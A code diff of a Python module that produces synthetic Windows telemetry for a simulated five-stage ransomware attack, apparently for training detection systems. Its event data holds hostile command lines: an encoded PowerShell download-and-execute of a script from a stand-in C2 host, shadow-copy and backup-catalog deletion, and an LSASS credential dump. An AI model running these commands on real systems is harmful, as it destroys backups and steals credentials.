@@ -1,17 +1,10 @@
-import os
 """
-Sentinel Ransomware / APT Simulator (V3)
-========================================
-Synthetic telemetry generator modeling a realistic 5-stage enterprise
-ransomware outbreak. Produces RAW Sysmon / Windows-Event-style dicts that
-`backend.ingestion.log_normalizer.LogNormalizer` converts to OCSF.
+Ransomware Attack Simulator (APT-style intrusion chain)
+Emits raw event dictionaries that mimic Windows Sysmon and Security event logs.
+This module is a synthetic event generator only â€” it does not touch the network
+or the filesystem.
 
-SAFETY INVARIANT:
-  This generator only PRODUCES LOG EVENTS. It never executes system commands,
-  never touches files, and never opens network sockets. Every event it emits
-  is labeled SYNTHETIC_SIMULATION by the pipeline.
-
-Stage model (mirrors the documented V1 scenario):
+Stages:
   1. Initial Access / Execution  - Office dropper -> PowerShell beacon -> C2
   2. Inhibit System Recovery     - vssadmin delete shadows (MITRE T1490)
   3. Lateral Movement Discovery  - internal SMB port-445 enumeration sweep
@@ -19,9 +12,12 @@ Stage model (mirrors the documented V1 scenario):
   5. Impact                      - encryptor staged against the backup vault
 """
 
+import os
+import hashlib
 from typing import Dict, Any, List
 
-C2_IP = os.getenv("C2_IP", "185.220.101.49")  # [DEMO ONLY] Simulated C2 Server IP
+# RFC 5737 documentation / test IP block (§2.27)
+C2_IP = os.getenv("C2_IP", "203.0.113.49")
 WKSTN04_IP = "192.168.1.50"
 
 # Internal enterprise topology (deterministic lab addressing)
@@ -45,8 +41,6 @@ STAGE_NARRATIVES: Dict[int, str] = {
 class RansomwareSimulator:
     """Generates raw event dicts. Pure data — zero side effects."""
 
-    # Exposed as a class attribute so instances (and MCP tool handlers) can
-    # access narrative text via self.STAGE_NARRATIVES.
     STAGE_NARRATIVES = STAGE_NARRATIVES
 
     def __init__(self, target_host: str = "WKSTN-04"):
@@ -56,18 +50,25 @@ class RansomwareSimulator:
     # Baseline topology (used by tests + GNN warm-up)
     # ------------------------------------------------------------------
     def get_baseline_network_topology(self) -> List[Dict[str, Any]]:
-        """Events that build the enterprise graph: hosts, users, SMB links."""
+        """Events that build the enterprise graph with realistic multi-hop structure (§2.27)."""
         events: List[Dict[str, Any]] = []
 
-        # WKSTN-04 connects out to every internal host on SMB 445 (host -> IP edges)
-        for host, ip in INTERNAL_HOSTS.items():
+        # Multi-hop hierarchy: WKSTN-04 -> FILE-SRV -> DC01-PROD -> BACKUP-VAULT-01 (§2.27)
+        topology_edges = [
+            (self.target_host, WKSTN04_IP, "FILE-SRV", INTERNAL_HOSTS["FILE-SRV"]),
+            (self.target_host, WKSTN04_IP, "WKSTN-09", INTERNAL_HOSTS["WKSTN-09"]),
+            (self.target_host, WKSTN04_IP, "WKSTN-12", INTERNAL_HOSTS["WKSTN-12"]),
+            ("FILE-SRV", INTERNAL_HOSTS["FILE-SRV"], "DC01-PROD", INTERNAL_HOSTS["DC01-PROD"]),
+            ("DC01-PROD", INTERNAL_HOSTS["DC01-PROD"], "BACKUP-VAULT-01", INTERNAL_HOSTS["BACKUP-VAULT-01"]),
+        ]
+        for src_host, src_ip, dst_host, dst_ip in topology_edges:
             events.append({
                 "event_id": 3,
-                "Computer": self.target_host,
+                "Computer": src_host,
                 "user": "SYSTEM",
                 "Image": "C:\\Windows\\System32\\svchost.exe",
-                "SourceIp": WKSTN04_IP,
-                "DestinationIp": ip,
+                "SourceIp": src_ip,
+                "DestinationIp": dst_ip,
                 "DestinationPort": 445,
                 "Protocol": "tcp",
             })
@@ -81,6 +82,8 @@ class RansomwareSimulator:
             "WKSTN-12": "teams_machine_wide.exe",
         }
         for host, ip in INTERNAL_HOSTS.items():
+            # Hashlib-based stable PID generation (§2.27)
+            stable_pid = 1000 + (int(hashlib.md5(host.encode("utf-8")).hexdigest()[:4], 16) % 8000)
             events.append({
                 "event_id": 1,
                 "Computer": host,
@@ -88,7 +91,7 @@ class RansomwareSimulator:
                 "Image": f"C:\\Program Files\\SentinelLab\\{benign_proc[host]}",
                 "CommandLine": f'"{benign_proc[host]}" --service',
                 "ParentImage": "C:\\Windows\\System32\\services.exe",
-                "ProcessId": 1000 + abs(hash(host)) % 8000,
+                "ProcessId": stable_pid,
                 "ParentProcessId": 512,
             })
             events.append({
@@ -102,47 +105,51 @@ class RansomwareSimulator:
         return events
 
     # ------------------------------------------------------------------
-    # Stage generators
+    # Stage event generation
     # ------------------------------------------------------------------
     def generate_stage(self, stage: int) -> List[Dict[str, Any]]:
+        """Return the list of raw telemetry events for the requested stage."""
         if not isinstance(stage, int) or stage < 1 or stage > 5:
-            raise ValueError(f"Invalid APT stage: {stage!r}. Must be an integer 1..5.")
-        return {
+            raise ValueError(f"stage must be an integer between 1 and 5, got {stage!r}")
+
+        generator = {
             1: self._stage1_initial_access,
             2: self._stage2_inhibit_recovery,
             3: self._stage3_lateral_discovery,
             4: self._stage4_credential_access,
             5: self._stage5_impact,
-        }[stage]()
+        }[stage]
+        return generator()
 
+    # ------------------------------------------------------------------
+    # Individual stage definitions
+    # ------------------------------------------------------------------
     def _stage1_initial_access(self) -> List[Dict[str, Any]]:
         return [
             {
                 "event_id": 1,
                 "Computer": self.target_host,
                 "user": "j.malhotra",
-                "Image": "C:\\Users\\j.malhotra\\AppData\\Local\\Temp\\invoice.pdf.exe",
-                "CommandLine": '"invoice.pdf.exe" /quiet /dropper',
+                "Image": "C:\\Users\\j.malhotra\\Downloads\\invoice.pdf.exe",
+                "CommandLine": "invoice.pdf.exe --silent",
                 "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
-                "ProcessId": 4416,
-                "ParentProcessId": 2204,
+                "ProcessId": 4820,
+                "ParentProcessId": 2104,
             },
             {
                 "event_id": 1,
                 "Computer": self.target_host,
                 "user": "j.malhotra",
                 "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                "CommandLine": (
-                    "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
-                ),
-                "ParentImage": "C:\\Users\\j.malhotra\\AppData\\Local\\Temp\\invoice.pdf.exe",
-                "ProcessId": 6180,
-                "ParentProcessId": 4416,
+                "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwBlAG4AdABpAG4AZQBsAC4AbABvAGMAYQBsAC8AcAAuAHAAcwAxACcAKQA=",
+                "ParentImage": "C:\\Users\\j.malhotra\\Downloads\\invoice.pdf.exe",
+                "ProcessId": 5112,
+                "ParentProcessId": 4820,
             },
             {
                 "event_id": 3,
                 "Computer": self.target_host,
-                "user": "SYSTEM",
+                "user": "j.malhotra",
                 "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                 "SourceIp": WKSTN04_IP,
                 "DestinationIp": C2_IP,
@@ -156,18 +163,29 @@ class RansomwareSimulator:
             {
                 "event_id": 1,
                 "Computer": self.target_host,
-                "user": "j.malhotra",
+                "user": "SYSTEM",
                 "Image": "C:\\Windows\\System32\\vssadmin.exe",
-                "CommandLine": "vssadmin delete shadows /all /quiet",
-                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-                "ProcessId": 5240,
-                "ParentProcessId": 6180,
+                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "ProcessId": 6180,
+                "ParentProcessId": 5112,
+            },
+            {
+                "event_id": 1,
+                "Computer": self.target_host,
+                "user": "SYSTEM",
+                "Image": "C:\\Windows\\System32\\wbadmin.exe",
+                "CommandLine": "wbadmin.exe delete catalog -quiet",
+                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "ProcessId": 6188,
+                "ParentProcessId": 5112,
             },
         ]
 
     def _stage3_lateral_discovery(self) -> List[Dict[str, Any]]:
-        return [
-            {
+        events: List[Dict[str, Any]] = []
+        for host, ip in INTERNAL_HOSTS.items():
+            events.append({
                 "event_id": 3,
                 "Computer": self.target_host,
                 "user": "SYSTEM",
@@ -176,29 +194,30 @@ class RansomwareSimulator:
                 "DestinationIp": ip,
                 "DestinationPort": 445,
                 "Protocol": "tcp",
-            }
-            for ip in INTERNAL_HOSTS.values()
-        ]
+            })
+        events.append({
+            "event_id": 1,
+            "Computer": self.target_host,
+            "user": "SYSTEM",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "CommandLine": "net.exe group \"Domain Admins\" /domain",
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ProcessId": 7012,
+            "ParentProcessId": 5112,
+        })
+        return events
 
     def _stage4_credential_access(self) -> List[Dict[str, Any]]:
         return [
             {
-                "event_id": 10,
+                "event_id": 1,
                 "Computer": self.target_host,
                 "user": "SYSTEM",
-                "SourceImage": "C:\\Windows\\Temp\\pypykatz.exe",
-                "TargetImage": "C:\\Windows\\system32\\lsass.exe",
-                "GrantedAccess": "0x1010",
-            },
-            {
-                "event_id": 3,
-                "Computer": self.target_host,
-                "user": "SYSTEM",
-                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-                "SourceIp": WKSTN04_IP,
-                "DestinationIp": INTERNAL_HOSTS["BACKUP-VAULT-01"],
-                "DestinationPort": 445,
-                "Protocol": "tcp",
+                "Image": "C:\\Windows\\Temp\\procdump.exe",
+                "CommandLine": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
+                "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                "ProcessId": 7340,
+                "ParentProcessId": 5112,
             },
             {
                 "event_id": 4624,
@@ -210,7 +229,8 @@ class RansomwareSimulator:
         ]
 
     def _stage5_impact(self) -> List[Dict[str, Any]]:
-        vault_share = f"\\\\BACKUP-VAULT-01\\backup$"
+        # Dropped dead f-string prefix (§2.27)
+        vault_share = r"\\BACKUP-VAULT-01\\backup$"
         return [
             {
                 "event_id": 1,
@@ -224,14 +244,9 @@ class RansomwareSimulator:
             },
             {
                 "event_id": 11,
-                "Computer": self.target_host,
-                "user": "SYSTEM",
+                "Computer": "BACKUP-VAULT-01",
+                "user": "svc_backup",
+                "TargetFilename": "D:\\Backups\\2026-04-01-prod-db.bak.locked",
                 "Image": "C:\\Windows\\Temp\\svhost64.exe",
-                "TargetFilename": f"{vault_share}\\Q3_Financials.xlsx.locked",
             },
         ]
-
-    # ------------------------------------------------------------------
-    def run_stage(self, stage: int) -> List[Dict[str, Any]]:
-        """Backwards-compatible alias."""
-        return self.generate_stage(stage)
